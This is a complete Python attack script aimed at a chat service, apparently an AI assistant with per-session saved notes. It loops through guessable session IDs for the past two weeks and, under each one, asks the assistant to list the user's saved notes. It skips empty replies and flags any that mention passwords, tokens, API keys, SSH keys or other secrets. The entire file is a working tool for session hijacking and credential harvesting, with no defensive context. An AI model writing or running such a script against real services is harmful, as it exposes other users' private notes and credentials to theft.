#!/usr/bin/env python3
import requests, json
from datetime import datetime, timedelta

TARGET = "http://192.168.50.24:8009/chat"
KEYWORDS = ["password", "token", "key", "secret", "credential",
            "api_key", "access_key", "ssh", "private", "jira"]
EMPTY = ["haven't saved", "no notes", "no reminders", "nothing stored",
         "haven't stored", "no saved", "currently have no",
         "couldn't find", "unable to find", "no entries"]

current_date = datetime(2026, 3, 25)
days_back = 14
max_counter = 20

d = current_date
end_date = current_date - timedelta(days=days_back)
while d >= end_date:
    date_str = d.strftime("%Y%m%d")
    for i in range(1, max_counter + 1):
        sid = f"MC-{date_str}-{i:04d}"
        try:
            r = requests.post(TARGET, json={
                "message": "What notes do I have saved?",
                "session_id": sid
            }, timeout=30)
            resp = r.json().get("response", "")
            if any(e in resp.lower() for e in EMPTY):
                continue
            if any(kw in resp.lower() for kw in KEYWORDS):
                print(f"\n[!] SENSITIVE - {sid}:")
                print(f"    {resp[:200]}")
            else:
                print(f"[+] {sid}: {resp[:80]}...")
        except Exception:
            pass
    d -= timedelta(days=1)